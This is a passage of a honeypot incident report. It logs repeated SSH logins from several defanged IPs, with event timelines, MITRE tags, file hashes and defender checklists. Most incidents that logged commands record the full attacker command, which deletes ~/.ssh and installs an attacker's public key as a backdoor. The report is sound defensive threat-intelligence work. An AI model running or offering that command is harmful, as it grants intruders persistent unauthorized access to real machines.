| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:05:41` | `cowrie.session.connect` |
| `2026-04-21 05:05:41` | `cowrie.client.version` |
| `2026-04-21 05:05:42` | `cowrie.client.kex` |
| `2026-04-21 05:05:42` | `cowrie.login.success` |
| `2026-04-21 05:05:43` | `cowrie.session.params` |
| `2026-04-21 05:05:43` | `cowrie.command.input` |
| `2026-04-21 05:05:43` | `cowrie.command.failed` |
| `2026-04-21 05:05:43` | `cowrie.log.closed` |
| `2026-04-21 05:05:43` | `cowrie.session.params` |
| `2026-04-21 05:05:43` | `cowrie.command.input` |
| `2026-04-21 05:05:43` | `cowrie.session.file_download` |
| `2026-04-21 05:05:43` | `cowrie.log.closed` |
| `2026-04-21 05:05:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.194.239[.]180` to AbuseIPDB if not already reported
- [ ] Block `103.194.239[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-385480cb6cd1

| Field | Detail |
|---|---|
| **Source IP** | `103.194.239[.]180` |
| **First Seen** | 2026-04-21 05:05 |
| **Last Seen** | 2026-04-21 05:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:05:45` | `cowrie.session.connect` |
| `2026-04-21 05:05:45` | `cowrie.client.version` |
| `2026-04-21 05:05:46` | `cowrie.client.kex` |
| `2026-04-21 05:05:46` | `cowrie.login.success` |
| `2026-04-21 05:05:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.194.239[.]180` to AbuseIPDB if not already reported
- [ ] Block `103.194.239[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51e5e3368e2a

| Field | Detail |
|---|---|
| **Source IP** | `37.143.61[.]132` |
| **First Seen** | 2026-04-21 05:06 |
| **Last Seen** | 2026-04-21 05:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:06:16` | `cowrie.session.connect` |
| `2026-04-21 05:06:16` | `cowrie.client.version` |
| `2026-04-21 05:06:16` | `cowrie.client.kex` |
| `2026-04-21 05:06:17` | `cowrie.login.success` |
| `2026-04-21 05:06:17` | `cowrie.session.params` |
| `2026-04-21 05:06:17` | `cowrie.command.input` |
| `2026-04-21 05:06:17` | `cowrie.command.failed` |
| `2026-04-21 05:06:17` | `cowrie.log.closed` |
| `2026-04-21 05:06:18` | `cowrie.session.params` |
| `2026-04-21 05:06:18` | `cowrie.command.input` |
| `2026-04-21 05:06:18` | `cowrie.session.file_download` |
| `2026-04-21 05:06:18` | `cowrie.log.closed` |
| `2026-04-21 05:06:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.143.61[.]132` to AbuseIPDB if not already reported
- [ ] Block `37.143.61[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a633b8175d03

| Field | Detail |
|---|---|
| **Source IP** | `37.143.61[.]132` |
| **First Seen** | 2026-04-21 05:06 |
| **Last Seen** | 2026-04-21 05:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:06:21` | `cowrie.session.connect` |
| `2026-04-21 05:06:21` | `cowrie.client.version` |
| `2026-04-21 05:06:21` | `cowrie.client.kex` |
| `2026-04-21 05:06:22` | `cowrie.login.success` |
| `2026-04-21 05:06:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.143.61[.]132` to AbuseIPDB if not already reported
- [ ] Block `37.143.61[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74e95c95d655

| Field | Detail |
|---|---|
| **Source IP** | `37.143.61[.]132` |
| **First Seen** | 2026-04-21 05:07 |
| **Last Seen** | 2026-04-21 05:07 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:07:38` | `cowrie.session.connect` |
| `2026-04-21 05:07:38` | `cowrie.client.version` |
| `2026-04-21 05:07:39` | `cowrie.client.kex` |
| `2026-04-21 05:07:39` | `cowrie.login.success` |
| `2026-04-21 05:07:40` | `cowrie.session.params` |
| `2026-04-21 05:07:40` | `cowrie.command.input` |
| `2026-04-21 05:07:40` | `cowrie.command.failed` |
| `2026-04-21 05:07:40` | `cowrie.log.closed` |
| `2026-04-21 05:07:41` | `cowrie.session.params` |
| `2026-04-21 05:07:41` | `cowrie.command.input` |
| `2026-04-21 05:07:41` | `cowrie.session.file_download` |
| `2026-04-21 05:07:41` | `cowrie.log.closed` |
| `2026-04-21 05:07:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.143.61[.]132` to AbuseIPDB if not already reported
- [ ] Block `37.143.61[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bb9abc1ea5f

| Field | Detail |
|---|---|
| **Source IP** | `37.143.61[.]132` |
| **First Seen** | 2026-04-21 05:07 |
| **Last Seen** | 2026-04-21 05:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:07:46` | `cowrie.session.connect` |
| `2026-04-21 05:07:46` | `cowrie.client.version` |
| `2026-04-21 05:07:46` | `cowrie.client.kex` |
| `2026-04-21 05:07:48` | `cowrie.login.success` |
| `2026-04-21 05:07:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.143.61[.]132` to AbuseIPDB if not already reported
- [ ] Block `37.143.61[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12fe771f85fb

| Field | Detail |
|---|---|
| **Source IP** | `182.229.12[.]64` |
| **First Seen** | 2026-04-21 05:07 |
| **Last Seen** | 2026-04-21 05:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:07:53` | `cowrie.session.connect` |
| `2026-04-21 05:07:53` | `cowrie.client.version` |
| `2026-04-21 05:07:53` | `cowrie.client.kex` |
| `2026-04-21 05:07:54` | `cowrie.login.success` |
| `2026-04-21 05:07:54` | `cowrie.session.params` |
| `2026-04-21 05:07:54` | `cowrie.command.input` |
| `2026-04-21 05:07:54` | `cowrie.command.failed` |
| `2026-04-21 05:07:54` | `cowrie.log.closed` |
| `2026-04-21 05:07:55` | `cowrie.session.params` |
| `2026-04-21 05:07:55` | `cowrie.command.input` |
| `2026-04-21 05:07:55` | `cowrie.session.file_download` |
| `2026-04-21 05:07:55` | `cowrie.log.closed` |
| `2026-04-21 05:07:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.229.12[.]64` to AbuseIPDB if not already reported
- [ ] Block `182.229.12[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6c470dfc336

| Field | Detail |
|---|---|
| **Source IP** | `182.229.12[.]64` |
| **First Seen** | 2026-04-21 05:07 |
| **Last Seen** | 2026-04-21 05:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:07:57` | `cowrie.session.connect` |
| `2026-04-21 05:07:57` | `cowrie.client.version` |
| `2026-04-21 05:07:57` | `cowrie.client.kex` |
| `2026-04-21 05:07:58` | `cowrie.login.success` |
| `2026-04-21 05:07:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.229.12[.]64` to AbuseIPDB if not already reported
- [ ] Block `182.229.12[.]64` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bb0948e3565

| Field | Detail |
|---|---|
| **Source IP** | `37.143.61[.]132` |
| **First Seen** | 2026-04-21 05:09 |
| **Last Seen** | 2026-04-21 05:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:09:05` | `cowrie.session.connect` |
| `2026-04-21 05:09:05` | `cowrie.client.version` |
| `2026-04-21 05:09:05` | `cowrie.client.kex` |
| `2026-04-21 05:09:06` | `cowrie.login.success` |
| `2026-04-21 05:09:07` | `cowrie.session.params` |
| `2026-04-21 05:09:07` | `cowrie.command.input` |
| `2026-04-21 05:09:07` | `cowrie.command.failed` |
| `2026-04-21 05:09:07` | `cowrie.log.closed` |
| `2026-04-21 05:09:07` | `cowrie.session.params` |
| `2026-04-21 05:09:07` | `cowrie.command.input` |
| `2026-04-21 05:09:08` | `cowrie.session.file_download` |
| `2026-04-21 05:09:08` | `cowrie.log.closed` |
| `2026-04-21 05:09:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.143.61[.]132` to AbuseIPDB if not already reported
- [ ] Block `37.143.61[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04eca2c97479

| Field | Detail |
|---|---|
| **Source IP** | `37.143.61[.]132` |
| **First Seen** | 2026-04-21 05:09 |
| **Last Seen** | 2026-04-21 05:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:09:10` | `cowrie.session.connect` |
| `2026-04-21 05:09:10` | `cowrie.client.version` |
| `2026-04-21 05:09:10` | `cowrie.client.kex` |
| `2026-04-21 05:09:11` | `cowrie.login.success` |
| `2026-04-21 05:09:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.143.61[.]132` to AbuseIPDB if not already reported
- [ ] Block `37.143.61[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e7bef4472e1

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]79` |
| **First Seen** | 2026-04-21 05:10 |
| **Last Seen** | 2026-04-21 05:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:10:24` | `cowrie.session.connect` |
| `2026-04-21 05:10:24` | `cowrie.client.version` |
| `2026-04-21 05:10:24` | `cowrie.client.kex` |
| `2026-04-21 05:10:25` | `cowrie.login.success` |
| `2026-04-21 05:10:25` | `cowrie.session.params` |
| `2026-04-21 05:10:25` | `cowrie.command.input` |
| `2026-04-21 05:10:25` | `cowrie.command.failed` |
| `2026-04-21 05:10:25` | `cowrie.log.closed` |
| `2026-04-21 05:10:25` | `cowrie.session.params` |
| `2026-04-21 05:10:25` | `cowrie.command.input` |
| `2026-04-21 05:10:25` | `cowrie.session.file_download` |
| `2026-04-21 05:10:25` | `cowrie.log.closed` |
| `2026-04-21 05:10:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]79` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd0807901749

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]79` |
| **First Seen** | 2026-04-21 05:10 |
| **Last Seen** | 2026-04-21 05:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:10:27` | `cowrie.session.connect` |
| `2026-04-21 05:10:27` | `cowrie.client.version` |
| `2026-04-21 05:10:27` | `cowrie.client.kex` |
| `2026-04-21 05:10:28` | `cowrie.login.success` |
| `2026-04-21 05:10:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]79` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d649d5f4715

| Field | Detail |
|---|---|
| **Source IP** | `103.194.239[.]180` |
| **First Seen** | 2026-04-21 05:10 |
| **Last Seen** | 2026-04-21 05:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:10:58` | `cowrie.session.connect` |
| `2026-04-21 05:10:58` | `cowrie.client.version` |
| `2026-04-21 05:10:58` | `cowrie.client.kex` |
| `2026-04-21 05:10:58` | `cowrie.login.success` |
| `2026-04-21 05:10:59` | `cowrie.session.params` |
| `2026-04-21 05:10:59` | `cowrie.command.input` |
| `2026-04-21 05:10:59` | `cowrie.command.failed` |
| `2026-04-21 05:10:59` | `cowrie.log.closed` |
| `2026-04-21 05:10:59` | `cowrie.session.params` |
| `2026-04-21 05:10:59` | `cowrie.command.input` |
| `2026-04-21 05:10:59` | `cowrie.session.file_download` |
| `2026-04-21 05:10:59` | `cowrie.log.closed` |
| `2026-04-21 05:11:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.194.239[.]180` to AbuseIPDB if not already reported
- [ ] Block `103.194.239[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84933a20422c

| Field | Detail |
|---|---|
| **Source IP** | `103.194.239[.]180` |
| **First Seen** | 2026-04-21 05:11 |
| **Last Seen** | 2026-04-21 05:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:11:01` | `cowrie.session.connect` |
| `2026-04-21 05:11:01` | `cowrie.client.version` |
| `2026-04-21 05:11:02` | `cowrie.client.kex` |
| `2026-04-21 05:11:02` | `cowrie.login.success` |
| `2026-04-21 05:11:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.194.239[.]180` to AbuseIPDB if not already reported
- [ ] Block `103.194.239[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c5631b45a36

| Field | Detail |
|---|---|
| **Source IP** | `37.143.61[.]132` |
| **First Seen** | 2026-04-21 05:11 |
| **Last Seen** | 2026-04-21 05:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:11:49` | `cowrie.session.connect` |
| `2026-04-21 05:11:49` | `cowrie.client.version` |
| `2026-04-21 05:11:49` | `cowrie.client.kex` |
| `2026-04-21 05:11:50` | `cowrie.login.success` |
| `2026-04-21 05:11:50` | `cowrie.session.params` |
| `2026-04-21 05:11:50` | `cowrie.command.input` |
| `2026-04-21 05:11:50` | `cowrie.command.failed` |
| `2026-04-21 05:11:51` | `cowrie.log.closed` |
| `2026-04-21 05:11:51` | `cowrie.session.params` |
| `2026-04-21 05:11:51` | `cowrie.command.input` |
| `2026-04-21 05:11:51` | `cowrie.session.file_download` |
| `2026-04-21 05:11:51` | `cowrie.log.closed` |
| `2026-04-21 05:11:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.143.61[.]132` to AbuseIPDB if not already reported
- [ ] Block `37.143.61[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d94e170753c0

| Field | Detail |
|---|---|
| **Source IP** | `37.143.61[.]132` |
| **First Seen** | 2026-04-21 05:11 |
| **Last Seen** | 2026-04-21 05:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:11:54` | `cowrie.session.connect` |
| `2026-04-21 05:11:54` | `cowrie.client.version` |
| `2026-04-21 05:11:55` | `cowrie.client.kex` |
| `2026-04-21 05:11:55` | `cowrie.login.success` |
| `2026-04-21 05:11:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.143.61[.]132` to AbuseIPDB if not already reported
- [ ] Block `37.143.61[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7718a680d876

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]79` |
| **First Seen** | 2026-04-21 05:12 |
| **Last Seen** | 2026-04-21 05:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:12:18` | `cowrie.session.connect` |
| `2026-04-21 05:12:18` | `cowrie.client.version` |
| `2026-04-21 05:12:18` | `cowrie.client.kex` |
| `2026-04-21 05:12:18` | `cowrie.login.success` |
| `2026-04-21 05:12:19` | `cowrie.session.params` |
| `2026-04-21 05:12:19` | `cowrie.command.input` |
